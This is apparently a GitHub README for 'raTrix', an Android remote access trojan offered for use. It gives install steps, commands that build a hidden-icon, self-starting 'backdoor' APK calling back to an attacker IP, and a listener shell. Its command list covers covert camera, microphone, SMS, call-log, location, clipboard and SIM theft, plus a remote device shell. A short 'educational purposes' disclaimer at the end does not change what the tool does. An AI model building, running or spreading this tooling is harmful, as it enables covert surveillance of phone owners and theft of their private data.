<img src="https://github.com/MrpasswordTz/raTrix/blob/main/images/2.jpg" alt= 'ratrix picture' >

# raTrix 🐀 
raTrix is a powerful Android administration tool designed for Linux systems. It utilizes Python on the client-side and Java on the server-side to provide a robust and efficient management solution.

# FEATURE FOR raTrix
<ul>
  <li>light apk</li>
  <li>shell and build mode</li>
  <li>it run background 24hrs</li>
  <li>it show device info,MAC Adress, device ip, simcard info</li>
  <li>Auto start backdoor</li>
  <li>sms viewing and callLogs viewing</li>
<li>all port-forwading</li>
  <li>microphone checking</li>
  <li>camera checking</li>
  <li>full persistent</li>
  <li>Easy To use</li>
  <li>no icon</li>
</ul>

 # installation on termux
```
pkg update
pkg upgrade
pkg install git
pkg install python python2 python3
pkg install openjdk-17
pkg install aapt
git clone https://github.com/MrpasswordTz/raTrix.git
cd raTrix
pip install -r requirements.txt 
```

# usages building mode
```
python3 raTrix.py --build [models]
modules:
 -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)

EXample: python3 raTrix.py --build -i 192.168.16.216 -p 443 -o sudo.apk
```

# Usages SHELL mode
```
Usage:
  python3 raTrix.py --shell [modules]
  modules:
    -i, --ip                Listner IP address
    -p, --port              Listner port number

Example: python3 raTrix.py --shell -i 192.168.16.216 -p 443
```
# Commands in shell mode
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
```
# Additional information in ngrok conf
```
Usage:
  python3 raTrix.py --build --ngrok [module]
  module:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "karma.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

# Examples 
<b>in buliding mode(generating apk)</b>
```
python3 raTrix.py -i 192.169.120.34 -p 8080 -o sudo.apk
```

<b>in shell mode (listening)</b>
```
python3 raTrix.py --shell -i 192.169.120.34 -p 8080
```

# Disclaimer
This tool is only for educational purposes, i will not be responsible for any Damage

<h1>TOOL IS UNDER CONSTRUCTION</h1>
